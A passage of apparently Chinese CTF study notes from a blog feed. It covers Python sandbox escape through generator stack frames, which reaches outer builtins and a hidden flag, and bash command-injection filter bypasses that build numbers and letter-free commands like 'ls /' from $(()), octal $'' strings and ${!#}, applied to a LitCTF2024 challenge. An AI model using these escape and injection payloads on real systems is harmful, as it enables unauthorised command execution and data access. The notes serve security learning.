+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里限制了输出不能有<code>THIS_IS_SEED</code>，所以需要绕过，如何绕过呢</p>
+<p>直接给其他师傅的paylaod，学习一下思路：<br>jay17师傅：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scq</span>():</span><br><span class="line">        <span class="keyword">yield</span> scq.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    scq = scq()  <span class="comment">#生成器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># frame = next(scq)  # 获取到生成器的栈帧对象</span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> scq][<span class="number">0</span>] <span class="comment">#由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(frame)</span></span><br><span class="line">    <span class="comment"># print(frame.f_back)</span></span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_globals[<span class="string">&quot;_&quot;</span>*<span class="number">2</span>+<span class="string">&quot;builtins&quot;</span>+<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]  <span class="comment">#[&#x27;_&#x27;&#x27;_bui&#x27;&#x27;ltins_&#x27;&#x27;_&#x27;]也行</span></span><br><span class="line">    <span class="built_in">dir</span> = gattr.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">str</span> = gattr.<span class="built_in">str</span>  <span class="comment"># 获取str方法</span></span><br><span class="line"></span><br><span class="line">    getflag = frame.f_back.f_back.f_back.f_code</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(getflag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<p>审一下代码，三个点比较重要：</p>
+<ul>
+<li><p>利用字节码来读</p>
+</li>
+<li><p>在全局空间对应的内置空间获得函数，</p>
+</li>
+<li><p>其次就是下面这个代码了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>前两个点不用说了，前面笔记有，主要看第三个点为什么可以这样读出来</p>
+<p>直接给代码测试：</p>
+<p>先给没有<code>str()</code>的结果：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">aoidhjaiodhj</span><br><span class="line">&lt;code <span class="built_in">object</span> haha at <span class="number">0x0000026423B663A0</span>, file <span class="string">&quot;D:\clx\ceshi.py&quot;</span>, line <span class="number">2</span>&gt;</span><br><span class="line">haha</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>再来看看使用<code>str()</code>转换为字符串的结果：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(d):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output(部分):</span><br><span class="line">(</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>对比可以看出这里当被转换为字符串时再使用for循环可以在读取一个字符就输出。这想到，牛逼。</p>
+<p>还有<a href="https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/">boogipop师傅</a>的，payload如下：</p>
+<p>对flag字符串有过滤，如下构造：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">        <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line">    pop = exp()</span><br><span class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line">        boo=exp</span><br><span class="line">    <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br><span class="line"><span class="built_in">print</span>(kino.f_code.co_consts[<span class="number">19</span>][<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>
+
+<p>主要了解一下<code>[19][1:]</code>，解答如下：</p>
+<ol>
+<li>**<code>[19]</code>**：<ul>
+<li>获取常量池中的第 19 个常量。常量池包含所有字面值（如字符串、数字）、函数对象、<code>None</code>、以及其他常量。</li>
+</ul>
+</li>
+<li>**<code>[1:]</code>**：<ul>
+<li>对该常量（假设是字符串）进行切片操作，获取从第二个字符到最后一个字符的部分。</li>
+</ul>
+</li>
+</ol>
+<p>假设第 19 个常量是一个字符串 <code>hello world</code>。那么：</p>
+<ul>
+<li><code>kino.f_code.co_consts[19]</code> 将是 <code>&#39;hello world&#39;</code>。</li>
+<li><code>kino.f_code.co_consts[19][1:]</code> 将是 <code>&#39;ello world&#39;</code>。</li>
+</ul>
+<p>因此，这段代码最终会打印 <code>kino.f_code.co_consts[19][1:]</code>，其中假设第 19 个常量是一个字符串，这个切片操作会打印出该字符串从第二个字符开始到最后的部分。</p>
+<p>复现总结，栈帧逃逸个人感觉考的就是在逃逸过后怎么操作，这就靠对python基础知识的积累了。</p>
+<p>笔记参考文章：<code>https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3DdSMOkdxWD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</code></p>
+<p><code>https://blog.csdn.net/spiritx/article/details/132504456</code></p>
+<p><code>https://blog.csdn.net/MXB_1220/article/details/124638449</code></p>
+<p><code>https://gairuo.com/p/python-function-code</code></p>
+<p><code>https://www.cnblogs.com/yangmingxianshen/p/11252541.html</code></p>
+<p><code>https://www.cnblogs.com/traditional/p/13524591.html</code></p>
+]]></content>
+      <categories>
+        <category>Python漏洞</category>
+        <category>Python栈帧逃逸</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>rce之利用shell变量</title>
+    <url>/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h3 id="rce-‘新’进阶"><a href="#rce-‘新’进阶" class="headerlink" title="rce ‘新’进阶"></a>rce ‘新’进阶</h3><p>现在稍微大型的比赛都不会考那些已经算是比较常见、常用、简单的绕过如简单的取反、自增等，需要进阶学习纪录一下。此为学习者笔记,还是<strong>强调知识点融会贯通</strong></p>
+<span id="more"></span>
+
+<h3 id="命令执行之构造数字"><a href="#命令执行之构造数字" class="headerlink" title="命令执行之构造数字"></a>命令执行之构造数字</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p><strong>在linux中<code>$(())</code>用于算术运算</strong>，在这个表达式中，你可以放入任何想要计算的运算式。</p>
+<p>先看下面这个式子：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png" alt="image-20240602213327932"></p>
+<p>这个式子中并没有给出任何具体的运算内容，系统默认执行了一个空的算数运算。所以在没有明确运算目标的情况下，**<code>$(())</code>返回的默认值是0**。（同时注意，个人认为，注意看payload以及执行情况，<code>$(())</code>本生就会执行后返回结果，不需要套一个<code>eval()</code>这种类似的执行函数）</p>
+<p>看看给了的正常的运算符</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png" alt="image-20240602214355554"></p>
+<p>重点来了，尝试将上面那个0取反<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png" alt="image-20240602214522539"></p>
+<p>得到-1，那么再取反一次<code>-2</code>看看<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png" alt="image-20240602214739811"></p>
+<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
+<p>比如想要获得1，就可以像上面一样构造，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png" alt="image-20240602215641095"></p>
+<p>现在想要构造就很简单了，比如又想构造<code>2</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png" alt="image-20240602215758986"></p>
+<p>这样就可以构造任意数字。</p>
+<p><strong>同时注意加号在某些情况下可以省略</strong>（建议在去掉+号前先看看没去+号是什么样子的），比如那个生成1的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原：</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line"></span><br><span class="line">去掉+号后</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))))))  如下图</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png" alt="image-20240602222226786"></p>
+<p>成功执行。</p>
+<p>但是注意，为什么要加某些情况下呢，比如下面这个测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line">生成2的payload，那么现在将+去掉，如下：</span><br><span class="line">echo $(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png" alt="image-20240602222408309"></p>
+<p>这里生成的却是11，嘿嘿，这是怎么回事，注意看这个payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">先像上面那个1那样只去掉构造出1的+号，再看看执行结果，如下：</span><br><span class="line">$(($((~$(($((~$(())))$((~$(())))))))+$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png" alt="image-20240602222634293"></p>
+<p>成功得到2，那么为什么将中间那个<code>+</code>去掉就不对了呢，个人认为是符号判定的问题，用代码表示一下去掉<code>+</code>后的情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(($((~$(())))$((~$(()))))))) $((~$(($((~$(())))$((~$(()))))))) ))</span><br></pre></td></tr></table></figure>
+
+<p>用空格分隔了一下，注意看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))))))  已经符合一个完整的格式，会得到1，那么两个1就会得到11，这就是为什么可以得到11的原因</span><br></pre></td></tr></table></figure>
+
+<p>那么现在来和之前生成1的payload对比一下（同样用空格分隔）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ~$(($((~$(()))) $((~$(()))))) ))</span><br></pre></td></tr></table></figure>
+
+<p>这样并不能形成一个完整的可计算的格式，故只能类似之前那样有个<code>+</code>，所以这里的<code>+</code>号可以省略，而那个2不能。</p>
+<p><strong>那么如果遇到过滤<code>+</code>号的题</strong>，2该如何构造呢，注意看：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png" alt="image-20240602223600280"></p>
+<p>尝试一下构造<code>-3</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1: $((~$(())))</span><br><span class="line"></span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line">可以直接得到2，看了一下构造，应该是可以去掉+号的，尝试一下：</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(()))))))) ,成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png" alt="image-20240602223942848"></p>
+<p>多尝试，看构造，较重要</p>
+<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>LitCTF2024 - 百万美元的诱惑</p>
+<p>开题：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单的绕过，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2&amp;c=2025a</span><br></pre></td></tr></table></figure>
+
+<p>然后给了第二关<code>/dollar.php</code>，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>正好对应这个知识点，构造如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">刚刚好我在学习时构造出了11，这里直接利用</span><br><span class="line">11+1=12 ： $(($((~$(($((~$(())))$((~$(())))))))+$(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))))</span><br></pre></td></tr></table></figure>
+
+<p>刚好这里没有禁+号，直接抓包后传进去即可</p>
+<h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
+<p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
+<p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
+<h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>这一板块去跟一下最早的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">文章</a>。</p>
+<p><strong>这道题允许的字符串<code>$()#!&#123;&#125;&lt;\’,</code></strong></p>
+<p>这里说明一下相关变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）$# -参数数量-单独使用结果为0</span><br><span class="line">（2）$&#123;##&#125; -计数变量（#）长度，这里的结果为1</span><br><span class="line">（3）$((expr)) -算术表达式</span><br><span class="line">（4）&lt;&lt;&lt; -这是Bash shell语言中的重定向符，将一个变量或者字符串重定向到命令的标准输入（即wc -w &lt;&lt;&lt; &quot;H&quot;等价于echo &quot;H&quot; | wc -w）</span><br><span class="line">（5）$&#123;!var&#125; -间接引用</span><br><span class="line">（6）$&#x27;\123&#x27; -将八进制转换为字符串文字中的字符</span><br><span class="line">（7）&#123;a,b&#125; -花括号扩展</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里补充说明一下</strong>：</p>
+<ul>
+<li>对（5）的间接引用的说明，直接给shell测试代码：</li>
+</ul>
+<p>haha.sh:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=&quot;hello&quot;</span><br><span class="line">var2=&quot;var1&quot;</span><br><span class="line">echo $&#123;!var2&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再运行：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png" alt="image-20240603023300478"></p>
+<p>可以看到这里输出的是hello，这就是间接引用的定义。</p>
+<ul>
+<li>对（6）的补充说明，如下：</li>
+</ul>
+<p>一个小小的前置知识，看完理解一下就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls ==》 $&#x27;\154&#x27;$&#x27;\163&#x27; 这样是可以直接使用的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png" alt="image-20240603153444204"></p>
+<p>就是<code>$&#39;&#39;</code>会直接执行生成，所以交给编译器的是ls，也就会执行。</p>
+<p><strong>再进行组合运用一下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;)) - 1左移1，结果为2 位运算，与二进制的运算相关</span><br><span class="line">$&#123;!#&#125; - 执行 bash（因为第一个参数是 /bin/bash），可以在本地输出看看</span><br><span class="line">$((2#100)) -将二进制转换为十进制</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h5><p>先尝试<code>ls</code>，**<code>l</code>对应八进制为0154，<code>s</code>对应的八进制为0163。**</p>
+<p><strong>先用八进制表示，<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现<code>$&#39;\154\163&#39;</code>也可以表示<code>ls</code>，</strong>这里先跟文章，然后再尝试自己构造发现的同样表示ls的方法。</p>
+<p>注意组合运用那里<code>$((2#100))</code>可以将二进制100转换为十进制数4，采用这个思路来构造出整数，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br></pre></td></tr></table></figure>
+
+<p>那么现在就用<code>$#</code>（0）和<code>$</code>（1）来替换里面的数字，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 ：$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#</span><br><span class="line">163二进制数 ：$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以构造出二进制的数。</p>
+<p>那么此时就需要构造出前面的2，<strong>此时再看组合运用那里</strong>，<code>$(($&lt;&lt;$))</code>这样不就构造出2了吗，最终效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">同理</span><br><span class="line">163：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>这时再套入<code>$&#39;&#39;</code>，即（<code>$&#39;\154&#39;$&#39;\163&#39;</code>），如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先看正常包裹：</span><br><span class="line">$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))&#x27;$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line">这样并不能成功，请注意。估计就是套外面的特殊符号被当作字符串从而转义了，这里就需要在特殊符号前面加一个\防止被转义。</span><br><span class="line">那么再次尝试如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">输出看看</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png" alt="image-20240603125450576"></p>
+<p>但是注意，这个构造出来的<code>$&#39;\154&#39;$&#39;\163&#39;</code><strong>只会被当做字符串，并不会被当作命令执行再次执行从而形成ls</strong>，也就是说这里的<code>$&#39;&#39;</code>并没有起作用，本来它可以自己执行从而生成ls的，为什么不继续解析可以看看这个<a href="https://www.freebuf.com/articles/system/361101.html">文章</a>，可以在终端直接传，结果如下：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png" alt="image-20240603125825756"></p>
+<p>显示没有这个命令，那么此时我们就需要将这个传入bash使得这个被解析为<code>ls</code>，<strong>这次就可以利用到<code>&lt;&lt;&lt;</code>这个重定向符</strong>，如下格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以成功构造出ls，再传入的时候就可以被执行，但是这道题这里要求无字母，此时就<strong>可以用到间接扩展<code>$0</code>，单独使用在linux中对应bash</strong>，但是这道题不能有数字，看组合运用那里，就可以像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;!#&#125; &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>很怪的就是本地测试当中<code>bash&lt;&lt;&lt;.....</code>可以执行，但是<code>$0</code>和<code>$&#123;!#&#125;</code>都不能成功执行，报错如下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png" alt="image-20240603135658082"></p>
+<p><strong>怪？？？，怎么回事，可能是宝塔linux环境的问题吧，多尝试，注意看题目要求。</strong></p>
+<p>这里再用centos跑一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png" alt="image-20240603204933409"></p>
+<p>成功，这样就可以构造出没有数字字母的<code>ls</code>的payload了。</p>
+<p><strong>那么继续深入</strong>，比如读flag（<code>cat /flag</code>）或者查看根目录（<code>ls /</code>），<strong>尝试直接利用</strong>一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt; $&#x27;\154\163\40\57&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png" alt="image-20240603141433189"></p>
+<p>注意看，这里构造出来后被<code>ls /</code>被当作了整个字符串处理，而不是命令，这是怎么回事，<strong>这是因为<code>bash</code>是用空格分隔参数，这个方法（<code>$&#39;&#39;</code>）处理完的结果会导致整个结果都被当做了字符串（包括这里的空格）</strong>，这就导致了不能被正常解析为命令。解决方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要先给bash来参数分离一下，</span><br><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;   </span><br><span class="line">即可成功执行，还有问题的话就如这种格式尝试&#123;ls,/&#125;，注意&#123;ls,/&#125;也不能像之前ls那样直接利用，与ls /同样的问题。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>再来看看文章的问题</strong></p>
+<p>在传入时有效的做到了以下几点：</p>
